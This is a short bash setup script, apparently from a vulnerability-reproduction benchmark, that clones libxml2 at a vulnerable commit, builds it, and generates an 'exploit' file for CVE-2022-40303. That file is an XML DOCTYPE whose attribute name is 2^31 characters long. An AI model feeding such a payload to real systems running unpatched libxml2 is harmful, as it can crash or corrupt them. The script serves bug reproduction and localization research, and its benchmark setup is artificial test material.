#!/bin/bash
BUG_DIR=/data/vulnloc/libxml2/REDTEAM-CVE-2022-40303
PROJECT_URL=https://gitlab.gnome.org/GNOME/libxml2.git
BUG_COMMIT_ID=ae383bdb74523ddaf831d7db0690173c25e483b3

mkdir -p ${BUG_DIR}
pushd ${BUG_DIR}

git clone ${PROJECT_URL} src
pushd src
git checkout ${BUG_COMMIT_ID}

./autogen.sh
./configure --enable-static --disable-shared

# create the exploit file
python3 -c 'print("<!DOCTYPE doc [\n<!ATTLIST src " + "a"*(0x80000000) + " IDREF #IMPLIED>")' > exploit
